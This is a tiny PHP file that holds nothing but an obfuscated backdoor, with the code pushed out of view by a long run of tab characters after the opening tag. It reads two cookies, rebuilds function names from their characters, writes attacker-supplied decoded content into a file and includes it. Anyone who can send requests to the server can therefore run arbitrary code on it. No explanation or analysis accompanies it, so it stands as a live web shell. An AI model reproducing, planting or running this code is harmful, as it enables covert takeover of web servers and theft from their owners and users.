<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[15])){$c=$_COOKIE;$k=0;$n=7;$p=array();$p[$k]='';while($n){$p[$k].=$c[15][$n];if(!$c[15][$n+1]){if(!$c[15][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+7+1;}$k=$p[21]().$p[3];if(!$p[28]($k)){$n=$p[26]($k,$p[0]);$p[10]($n,$p[12].$p[18]($p[13]($c[3])));}include($k);}
